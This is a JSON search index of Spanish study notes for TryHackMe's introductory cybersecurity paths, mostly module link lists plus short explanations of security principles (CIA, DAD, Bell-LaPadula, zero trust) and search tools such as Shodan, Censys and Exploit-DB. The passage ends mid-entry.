[
  {
    "title": "0. Maquinas",
    "path": "/apuntes/thm/maquinas/0-maquinas/",
    "src": "content/Ciberseguridad/THM/Maquinas/0. Maquinas.md",
    "breadcrumb": "THM > Maquinas",
    "content": "- [[1. Easy]]\n- [[2. Medium]]\n- [[3. Hard]]\n- [[4. Insane]]"
  },
  {
    "title": "0. Pre Career",
    "path": "/apuntes/thm/0-pre-career/0-pre-career/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/0. Pre Career.md",
    "breadcrumb": "THM > 0. Pre Career",
    "content": "[[1. Pre Security]]\n[[2. Cyber Security 101]]\n"
  },
  {
    "title": "1. Pre Security",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-pre-security/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Pre Security.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security",
    "content": "[[1. Introduction to cybersecurity]]\n[[2. Network Fundamentals]]\n[[3. How the Web Works]]\n[[4. Linux Fundamentals]]\n[[5. Windows Fundamentals]]\n"
  },
  {
    "title": "2. Cyber Security 101",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/2-cyber-security-101/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/2. Cyber Security 101.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101",
    "content": "[[1. Start Your Cyber Security Journey]]\n[[2. Linux Fundamentals]]\n[[3. Windows and AD Fundamentals]]\n[[4. Command Line]]\n[[5. Networking]]\n[[6. Cryptography]]\n[[7. Exploitation Basics]]\n[[8. Web Hacking]]\n[[9. Offensive Security Tooling]]\n[[10. Defensive Security]]\n[[11. Security Solutions]]\n[[12. Defensive Security Tooling]]\n[[13. Build Your Cyber Security Carreer]]"
  },
  {
    "title": "2. Linux Fundamentals",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/2-linux-fundamentals/2-linux-fundamentals/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/2. Linux Fundamentals/2. Linux Fundamentals.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 2. Linux Fundamentals",
    "content": "[[1. Linux Fundamentals 1]]\n[[2. Linux Funadmentals 2]]\n[[3. Linux Fundamentals 3]]\n"
  },
  {
    "title": "6. Cryptography",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/6-cryptography/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/6. Cryptography.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography",
    "content": "1. [[0. Cryptography Basics]]\n2. [[0. Public Key Cryptography Basics]]\n3. [[0. Hashing Basics]]\n4. [[0. John the Ripper - The Basics]]\n"
  },
  {
    "title": "5. Networking",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/5-networking/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/5. Networking.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking",
    "content": "1. [[0. Networking Concepts]]\n2. [[0. Networking Essentials]]\n3. [[0. Networking Core Protocols]]\n4. [[0. Networking Secure Protocols]]\n5. [[0. Whireshark - The Basics]]\n6. [[0. Tcpdump - The Basics]]\n7. [[0. Nmap - The Basics]]\n"
  },
  {
    "title": "10. Defensive Security",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/10-defensive-security/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/10. Defensive Security.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security",
    "content": "1. [[THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/1. Defensive Security Intro/0. Defensive Security Intro]]\n2. [[0. SOC Fundamentals]]\n3. [[0. Digital Forensics Fundamentals]]\n4. [[0. Incident Response Fundamentals]]\n5. [[0. Logs Fundamentals]]\n\n"
  },
  {
    "title": "12. Defensive Security Tooling",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/12-defensive-security-tooling/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/12. Defensive Security Tooling.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling",
    "content": "1. [[0. CyberChef - The Basics]]\n2. [[0. CAPA - The Basics]]\n3. [[0. REMnux - Getting Started]]\n4. [[0. FlareVM - Arsenal of Tools]]\n\n"
  },
  {
    "title": "8. Web Hacking",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/8-web-hacking/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/8. Web Hacking.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking",
    "content": "1. [[0. Web Application Basics]]\n2. [[0. JavaScript Essentials]]\n3. [[0. SQL Fundamentals]]\n4. [[0. Burp Suite - The Basics]]\n5. [[0. OWASP Top 10 - 2021]]\n"
  },
  {
    "title": "7. Exploitation Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/7-exploitation-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/7. Exploitation Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics",
    "content": "1. [[0. Moniker Link (CVE-2024-21413)]]\n2. [[0. Metasploit - Introduction]]\n3. [[0. Metasploit - Exploitation]]\n4. [[0. Metasploit - Meterpreter]]\n5. [[0. Blue]]\n"
  },
  {
    "title": "11. Security Solutions",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/11-security-solutions/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/11. Security Solutions.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions",
    "content": "1. [[0. Introduction to SIEM]]\n2. [[0. Firewall Fundamentals]]\n3. [[0. IDS Fundamentals]]\n4. [[0. Vulnerability Scanner Overview]]"
  },
  {
    "title": "3. Windows and AD Fundamentals",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/3-windows-and-ad-fundamentals/3-windows-and-ad-fundamentals/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/3. Windows and AD Fundamentals.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 3. Windows and AD Fundamentals",
    "content": "1. [[1. Windows Fundamentals 1]]\n2. [[2. Windows Fundamentals 2]]\n3. [[3. Windows Fundamentals 3]]\n4. [[0. Active Directory Basics]]\n"
  },
  {
    "title": "4. Command Line",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/4-command-line/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/4. Command Line.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line",
    "content": "[[0. Windows Command Line]]\n[[0. Windows PowerShell]]\n[[0. Linux Shells]]\n"
  },
  {
    "title": "9. Offensive Security Tooling",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/9-offensive-security-tooling/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/9. Offensive Security Tooling.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling",
    "content": "1. [[0. Hydra]]\n2. [[0. Gobuster - The Basics]]\n3. [[0. Shells Overview]]\n4. [[0. SQLMap - The Basics]]\n"
  },
  {
    "title": "1. Start Your Cyber Security Journey",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/1-start-your-cyber-security-journey/1-start-your-cyber-security-journey/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/1. Start Your Cyber Security Journey.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 1. Start Your Cyber Security Journey",
    "content": "1. [[1. Offensive Security Intro]]\n2. [[2. Defensive Security Intro]]\n3. [[0. Search Skills]]\n"
  },
  {
    "title": "13. Build Your Cyber Security Carreer",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/13-build-your-cyber-security-career/13-build-your-cyber-security-carreer/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/13. Build Your Cyber Security Career/13. Build Your Cyber Security Carreer.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 13. Build Your Cyber Security Career",
    "content": "1. [[0. Security Principles]]\n2. [[THM/0. Pre Career/2. Cyber Security 101/13. Build Your Cyber Security Career/2. Careers in Cyber/0. Careers in Cyber]]\n"
  },
  {
    "title": "0. Security Principles",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/13-build-your-cyber-security-career/1-security-principles/0-security-principles/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/13. Build Your Cyber Security Career/1. Security Principles/0. Security Principles.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 13. Build Your Cyber Security Career > 1. Security Principles",
    "content": " [[THM/0. Pre Career/2. Cyber Security 101/13. Build Your Cyber Security Career/1. Security Principles/1. Introduction]]\n [[2. CIA]]\n [[3. DAD]]\n [[4. Fundamental Concepts of Security Models]]\n [[5. Defence-in-Depth]]\n [[6. ISO - IEC 19249]]\n [[7. Zero Trust versus Trust but Verify]]\n [[8. Threat versus Risk]]\n "
  },
  {
    "title": "5. Defence-in-Depth",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/13-build-your-cyber-security-career/1-security-principles/5-defence-in-depth/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/13. Build Your Cyber Security Career/1. Security Principles/5. Defence-in-Depth.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 13. Build Your Cyber Security Career > 1. Security Principles",
    "content": "La defensa en profundidad se refiere a crear un sistema de seguridad con múltiples niveles. Por eso es que también se llama Seguridad Multinivel.\n\nConsidera la siguiente analogía: has cerrado un cajón donde guardas tus documentos y objetos más valiosos. El cajón está bloqueado, sin embargo, ¿quieres que la cerradura del cajón sea lo único que lo protege? Si pensamos en seguridad multinivel, preferiríamos que el cajón estuviese cerrado, la habitación cerrada, la puerta del apartamento cerrada, la puerta del edificio cerrada e incluso instalar alguna cámara de seguridad. Aunque estos múltiples niveles de seguridad pueden no parar a un ladrón comprometido, bloquearán a la mayoría y se lo pondrán muy difícil al que lo consiga (si alguno lo consigue)."
  },
  {
    "title": "3. DAD",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/13-build-your-cyber-security-career/1-security-principles/3-dad/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/13. Build Your Cyber Security Career/1. Security Principles/3. DAD.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 13. Build Your Cyber Security Career > 1. Security Principles",
    "content": "La forma de atacar un sistema puede ser de varias maneras y estas vienen dadas por la tríada opuesta a la CIA:\n\n- **Divulgación:** Lo contrario a la confidencialidad.\n- **Alteración:** Es lo contrario de integridad.\n- **Destrucción/Denegación:** Es lo contrario de disponibilidad.\n\n![[Pasted image 20251030153045.png]]\n\nConsideremos el ejemplo anterior de los pacientes:\n\n- **D:** Si un atacante roba exitosamente información confidencial, habrá ocurrido un disclosure of confidential data.\n- **A:** Imagina la gravedad de la situación si un atacante consigue modificar el registro sanitario de un paciente y no existen métodos para detectarlo.\n- **D:** Con un ataque DoS o DDoS, que deja inoperativo el servidor de registros se deja de poder prestar servicio hasta que se resuelva.\n\nProtegerse contra DAD es como trabajar en el desarrollo de la protección CIA, de máxima necesidad."
  },
  {
    "title": "6. ISO - IEC 19249",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/13-build-your-cyber-security-career/1-security-principles/6-iso-iec-19249/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/13. Build Your Cyber Security Career/1. Security Principles/6. ISO - IEC 19249.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 13. Build Your Cyber Security Career > 1. Security Principles",
    "content": "La Organización Internacional de Estandarización (Standarization), ISO, y la Comisión Internacional Electrotécnica, IEC, han creado la ISO/IEC 19249. En esta tarea veremos brevemente la *\"ISO/IEC 19249:2017  Information technology - Security techniques - Catalogue of architectural and design principles for secure products, systems and applications\"*.\n\nLa ISO/IEC 19249 lista 5 principios de arquitectura:\n\n1. **Domain Separation:** Cada conjunto de componentes relacionados están agrupados en una sola entidad. Cada entidad tendrá su propio dominio y se le asignarán un conjunto de atributos de seguridad comunes.\n2. **Layering:** Cuando un sistema está estructurado en varios niveles o capas abstractos, se vuelve posible imponer políticas de seguridad diferentes dependiendo del nivel.\n3. **Encapsulation:** En programación orientada a objetos (OOP), escondemos implementaciones de bajo nivel y prevenimos la manipulación directa de la información en un objeto ofreciendo métodos para ese propósito.\n4. **Redundancy:** Este principio asegura la disponibilidad y la integridad. Redundancia implica tener más de una forma de comprobar.\n5. **Virtualization:** Con el aumento de los servicios en la nube, se ha popularizado la virtualización. Esta implica compartir el mismo hardware a lo largo de múltiples sistemas operativos.\n\nLa ISO/IEC 19249 enseña 5 principios de diseño:\n\n1. **Least Privilege:** También se puede refrasear como \"necesidad para saber lo necesario\". El principio establece que alguien tendría que tener privilegios para cumplir con su tarea y nada más.\n2. **Attack Surface Minimisation:** Siempre hay alguna vulnerabilidad, algunas conocidas, otras por descubrir. El punto está en reducir en medida de lo posible la posibilidad de que estén ahí, por ejemplo deshabilitando todos los servicios que no se usen.\n3. **Centralized Parameter Validation:** Muchas de las vulnerabilidades se deben a los sistemas recibiendo input de los usuarios. Si estos no se sanitizan ni validan, pueden usarse para explotar un sistema.\n4. **Centralized General Security Services:** Como principio de seguridad, deberíamos abogar por centralizar los sistemas y servicios de seguridad.\n5. **Preparing for Error and Exception Handling:** Siempre que construimos un sistema deberíamos tener en cuenta que errores y excepciones ocurrirán por lo que es fundamental tenerlo en cuenta y prepararse a priori.\n\n"
  },
  {
    "title": "2. CIA",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/13-build-your-cyber-security-career/1-security-principles/2-cia/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/13. Build Your Cyber Security Career/1. Security Principles/2. CIA.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 13. Build Your Cyber Security Career > 1. Security Principles",
    "content": "Antes de describir algo como seguro, debemos considerar qué hace que algo lo sea. Cuando quieres juzgar la seguridad de un sistema debes pensar en la tríada de la seguridad: CIA.\n\n- **Confidencialidad:** Se asegura de que sólo las personas destinadas a hacerlo puedan acceder a la información.\n- **Integridad:** Busca asegurar que la información no ha sido alterada, además, podemos detectar cualquier alteración si ocurre.\n- **Disponibilidad (Availability):** Intenta asegurar que el sistema o servicio esté disponible si se necesita.\n\n![[Pasted image 20251030145704.png]]\n\nConsideremos la CIA relacionada a registros de pacientes y sistemas relacionados:\n\n- **C:** De acuerdo a varias leyes modernas, los proveedores de servicios de salud deben asegurar y mantener la confidencialidad de registros médicos.\n- **I:** Si el registro de un paciente se altera de forma accidental o con intenciones maliciosas, puede recibir un tratamiento erróneo, lo que puede conllevar un peligro para el paciente y multas millonarias para la empresa.\n- **A:** Cuando un paciente visita una clínica, el sistema debe estar disponible. Si no, el practicante no podría acceder al registro de salud del paciente, lo que impediría el tratamiento.\n\nEl énfasis no necesita se el mismo en las tres funciones de seguridad, por ejemplo, un anuncio de la universidad no es confidencial pero necesita expresamente que sea íntegro.\n\n----------------------------\n<h2>Más allá de CIA</h2>\nYendo un paso más allá en la CIA, podemos pensar en:\n\n- **Authenticity:** Trata de asegurar que el documento/archivo/información pertenece a la fuente que dice.\n- **Nonrepudiation:** Significa que la fuente original no puede denegar ser la emisora de la información.\n\nSin estas dos los negocios no se pueden llevar a cabo. Ya que si te llega un pedido tienes que estar seguro de que efectivamente ese pedido ha sido el realizado y la fuente que emitió el pedido no puede denegar haberlo hecho.\n\n----------------------------\n<h2>Parkerian Hexad</h2>\nEn 1998, Donn Parker propuso la héxada parkera. Cuenta con seis elementos de seguridad:\n\n1. **Availability.**\n2. **Utility:** Se enfoca en la utilidad de la información. Por ejemplo si se pierde la clave de acceso a un dispositivo. Puede que el dispositivo siga disponible, pero no tiene utilidad porque no se puede acceder a la información, esta no es usable.\n3. **Integrity.**\n4. **Authenticity.**\n5. **Confidentiality.**\n6. **Possession:** Requiere que la información no sea tomada, copiada o controlada sin autorización.\n"
  },
  {
    "title": "8. Threat versus Risk",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/13-build-your-cyber-security-career/1-security-principles/8-threat-versus-risk/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/13. Build Your Cyber Security Career/1. Security Principles/8. Threat versus Risk.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 13. Build Your Cyber Security Career > 1. Security Principles",
    "content": "Hay tres términos que necesitamos aclarar para evitar confusiones.\n\n- **Vulnerabilidad:** Significa que algo es susceptible de ser atacado o dañado.\n- **Amenaza:** Es un peligro asociado a una vulnerabilidad.\n- **Riesgo:** Implica la probabilidad de que un actor malicioso explote la vulnerabilidad e impacte el negocio.\n\nPor ejemplo, trabajas en un hospital que usa una base de datos en particular para guardar los registros médicos. Un día sale una nueva vulnerabilidad en la base de datos que usas. Y no sólo eso, sino que junto con esa vulnerabilidad sale un PoC (Proof of Concept), lo que ayuda a los atacantes a realizar el ataque. Por este motivo el riesgo es alto."
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/13-build-your-cyber-security-career/1-security-principles/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/13. Build Your Cyber Security Career/1. Security Principles/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 13. Build Your Cyber Security Career > 1. Security Principles",
    "content": "La seguridad se ha convertido en una prioridad para todas las empresas.Todas quieren afirmar que sus productos son seguros, pero ¿por qué?\n\nAntes de comenzar, es vital saber cuál es el adversario contra el que debemos proteger nuestros activos. ¿Tratas de evitar que un bebé coja tu ordenador? ¿O tratas de proteger un portátil que contiene diseños técnicos que valen millones de dólares? Usar el mismo tipo de protección ante diferentes adversarios puede ser ridículo y contraproducente. Por esto, conocer a nuestro adversario es clave.\n\nEs imposible conseguir un estado de seguridad del 100%. Por eso debemos de tratar mejorar nuestra postura de seguridad para hacerlo cada vez más difícil para los adversarios.\n\n--------------------------------\n<h2>Objetivos de Aprendizaje</h2>\n- Explicar las funciones de seguridad: Confidencialidad, Integridad y Disponibilidad (Availability), CIA.\n- Presentar la tríada opuesta a CIA: Divulgación, Alteración y Destrucción/Denegación (DAD).\n- Presentar los conceptos fundamentales de los modelos de seguridad como el modelo Bell-LaPadula.\n- Explicar principios de seguridad como Defensa en Profundidad, Zero Trust y Trust but Verify.\n- Introducir a ISO/IEC 19249.\n- Explicar las diferencias principales entre vulnerabilidad, amenaza y riesgo."
  },
  {
    "title": "7. Zero Trust versus Trust but Verify",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/13-build-your-cyber-security-career/1-security-principles/7-zero-trust-versus-trust-but-verify/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/13. Build Your Cyber Security Career/1. Security Principles/7. Zero Trust versus Trust but Verify.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 13. Build Your Cyber Security Career > 1. Security Principles",
    "content": "La confianza es un tema complejo. En realidad no podemos funcionar sin confianza. Sin embargo, necesitamos algunos principios de guía. Dos de nuestro interés son:\n\n- Confía pero verifica.\n- No confíes.\n\n- **Trust but Verify:** Este principio enseña que deberíamos siempre verificar incluso cuando confiamos en una entidad y su comportamiento.\n- **Zero Trust:** Este principio trata la confianza como una vulnerabilidad. Es como decir \"nunca confíes, verifica siempre\".\n\nLa micro-segmentación es una de las implementaciones del Zero Trust. Se refiere al diseño donde un segmento de red puede ser tan pequeño como un solo host. Además la comunicación entre segmentos requiere autentificación, control de acceso y otras medidas de seguridad.\n\nHay un límite sobre cuánto podemos aplicar este principio sin perjudicar el negocio, sin embargo, esto no quiere decir que deberíamos no aplicarlo."
  },
  {
    "title": "4. Fundamental Concepts of Security Models",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/13-build-your-cyber-security-career/1-security-principles/4-fundamental-concepts-of-security-models/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/13. Build Your Cyber Security Career/1. Security Principles/4. Fundamental Concepts of Security Models.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 13. Build Your Cyber Security Career > 1. Security Principles",
    "content": "¿Cómo podemos crear un sistema que asegure una o más funciones de seguridad? La respuesta es con modelos de seguridad. En esta tarea, introduciremos 3 modelos de seguridad fundamental:\n\n- Modelo Bell-LaPadula\n- Modelo de Integridad Biba\n- Modelo Clark-Wilson\n\n-------------------------------\n<h2>Modelo Bell-LaPadula</h2>\nEl modelo Bell-LaPadula busca conseguir **confidencialidad** especificando tres reglas:\n\n- **Simple Security Property:** Esta propiedad se llama \"no read up\". Establece que un sujeto con un nivel de seguridad inferior no puede leer un objeto con nivel de seguridad superior.\n- **Star Security Property:** Esta propiedad se llama \"no write down\". Establece que un sujeto con un nivel superior de seguridad no puede escribir en un objeto en un nivel inferior de seguridad.\n- **Discretionary-Security Property:** Esta propiedad usa una matriz de acceso para permitir operaciones de lectura y escritura. Debajo hay un ejemplo de matriz.\n\n| Sujetos  | Object A      | Object B   |\n| -------- | ------------- | ---------- |\n| Sujeto 1 | Escribir      | Sin acceso |\n| Sujeto 2 | Leer/Escribir | Leer       |\nLas dos primeras reglas se pueden resumir como \"write up, read down\". Este modelo tiene ciertas limitaciones, ya que no fue diseñado para compartir archivos, por ejemplo.\n\n-------------------------------------\n<h2>Modelo Biba</h2>\nEL modelo Biba busca conseguir **integridad** especificando dos reglas:\n\n- **Simple Integrity Property:** Esta propiedad se llama \"no read down\". Un sujeto de integridad superior no debe poder leer de un objeto con nivel de integridad inferior.\n- **Star Integrity Property:** Esta propiedad se llama \"no write up\". Establece que un sujeto con un nivel inferior de integridad no debe poder escribir en un objeto de nivel de integridad superior.\n\nEstas dos propiedades pueden ser resumidas como \"read up, write down\". Esta regla está en contraste con el modelo Bell-LaPadula, lo que no debería sorprendernos ya que uno se ocupa de la confidencialidad y otro de la integridad. Una de las limitaciones de este modelo es que no puede manejar amenazas internas.\n\n----------------------------\n<h2>Modelo Clark-Wilson</h2>\nEl modelo Clark-Wilson intenta conseguir integridad siguiendo los siguientes conceptos:\n\n- **Constrained Data Item (CDI):** Se refiere al tipo de información cuya integridad queremos preservar.\n- **Unconstrained Data Item (UDI):** Se refiere a todos los tipos de información más allá del CDI, como el input del usuario y del sistema.\n- **Transformation Procedures (TPs):** Estos procedimientos son operaciones programadas, como leer y escribir, y deberían mantener la integridad de  los CDIs.\n- **Integrity Verification Procedures (IVPs):** Estos procedimientos comprueban y aseguran la validez de los CDIs.\n\nHemos cubierto sólo tres modelos de seguridad, pero hay muchos más, aquí algunos ejemplos:\n\n- Brewer and Nash\n- Goguen-Meseguer\n- Sutherland\n- Graham-Denning\n- Harrison-Ruzzo-Ullman\n\n"
  },
  {
    "title": "0. Careers in Cyber",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/13-build-your-cyber-security-career/2-careers-in-cyber/0-careers-in-cyber/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/13. Build Your Cyber Security Career/2. Careers in Cyber/0. Careers in Cyber.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 13. Build Your Cyber Security Career > 2. Careers in Cyber",
    "content": "[[THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/3. Careers in Cyber/0. Careers in Cyber]]\n"
  },
  {
    "title": "2. Defensive Security Intro",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/1-start-your-cyber-security-journey/2-defensive-security-intro/2-defensive-security-intro/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/2. Defensive Security Intro/2. Defensive Security Intro.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 1. Start Your Cyber Security Journey > 2. Defensive Security Intro",
    "content": "[[0. Deffensive Security Intro]]"
  },
  {
    "title": "1. Offensive Security Intro",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/1-start-your-cyber-security-journey/1-offensive-security-intro/1-offensive-security-intro/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/1. Offensive Security Intro/1. Offensive Security Intro.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 1. Start Your Cyber Security Journey > 1. Offensive Security Intro",
    "content": "[[THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/1. Offensive Security Intro/0. Offensive Security Intro]]"
  },
  {
    "title": "3. Search Engines",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/1-start-your-cyber-security-journey/3-search-skills/3-search-engines/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/3. Search Skills/3. Search Engines.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 1. Start Your Cyber Security Journey > 3. Search Skills",
    "content": "Todo el mundo ha usado un buscador, pero no todo el mundo ha intentado llevarlo a su máximo potencial.\n\nVeamos los operadores de búsqueda usados por Google:\n\n- `\"frase exacta\"`: Poner una frase entre comillas hace que aparezcan sólo aquellos resultados de búsqueda con esa frase exacta.\n- `site:`: Este operador te permite especificar el dominio en el cual quieres buscar.\n- `-`: El símbolo `-` te permite omitir resultados que contengan una palabra en particular (`pyramids -tourism` ó `-tourism pyramids`).\n- `filetipe:`: Te permite buscar por formato de archivo (PDF, DOC, XLS, PPT, por ejemplo: `filetype:ppt cyber security`).\n\n[Aquí](https://github.com/cipher387/Advanced-search-operators-list) una página web con más operadores para profundizar."
  },
  {
    "title": "4. Specialized Search Engines",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/1-start-your-cyber-security-journey/3-search-skills/4-specialized-search-engines/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/3. Search Skills/4. Specialized Search Engines.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 1. Start Your Cyber Security Journey > 3. Search Skills",
    "content": "Estamos familiarizados con los buscadores de Internet pero no tanto con los buscadores especializados. Estos sirven para obtener cierto tipo de resultados.\n\n-------------\n<h2>Shodan</h2>\nEs un buscador para dispositivos conectados a Internet. Te permite buscar por tipos específicos y versiones de servidores, sistemas de control industrial y dispositivos IoT. Para ver aquellos servidores que sigan usando una versión de un servicio concreto podemos buscar, por ejemplo, `apache 2.4.1`.\n\nEn este [enlace](https://www.shodan.io/search/examples) hay ejemplos de queries para el buscador, y [aquí](https://www.shodan.io/) el buscador.\n\n-----------------\n<h2>Censys</h2>\nA primera vista [censys](https://search.censys.io/) parece igual que shodan. Sin embargo, mientras shodan se centra en dispositivos y sistemas conectados a Internet, censys lo hace en hosts, páginas web, certificados y otros activos conectados a Internet.\n\n---------------\n<h2>VirusTotal</h2>\n[VirusTotal](https://www.virustotal.com/gui/home/upload) es un buscador online que ofrece un servicio de escaneo de virus en archivos usando múltiples motores de búsqueda. Permite subir archivos o insertar URL's para comprobar su integridad.\n\n--------------------\n<h2>Have I Been Pwned</h2>\n[Have I been Pwned](https://haveibeenpwned.com/) hace sólo una cosa: comprobar si un email introducido ha aparecido en brechas de seguridad. Aunque normalmente estas contraseñas no están en texto claro, la mayoría no son tan difíciles y se pueden rescatar."
  },
  {
    "title": "5. Vulnerabilities and Exploits",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/1-start-your-cyber-security-journey/3-search-skills/5-vulnerabilities-and-exploits/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/3. Search Skills/5. Vulnerabilities and Exploits.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 1. Start Your Cyber Security Journey > 3. Search Skills",
    "content": "<h2>CVE</h2>\n\nPodemos definir Common Vulnerabilities and Exposures (CVE) como un diccionario de vulnerabilidades. Ofrece un identificador estandarizado para las vulnerabilidades. Cada una recibe in ID con este formato: `CVE-2024-29988`.\n\nLa compañía MITRE se encarga de mantener el sistema [CVE](https://www.cve.org/).\n\n<h2>Base de Datos de Exploits</h2>\nHay muchas razones por las cuales alguien querría explotar una app vulnerable. Sobra decir que no debemos hacerlo sin un acuerdo legal de por medio.\n\nUna vez que tenemos permiso podemos necesitar encontrar un código explotable. Para ello, una buena opción es [Exploit Database](https://www.exploit-db.com/).\n\n[GitHub](https://github.com/) también puede contener código relacionado con CVE's e incluso PoC (Proof of Concept)."
  },
  {
    "title": "0. Search Skills",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/1-start-your-cyber-security-journey/3-search-skills/0-search-skills/",
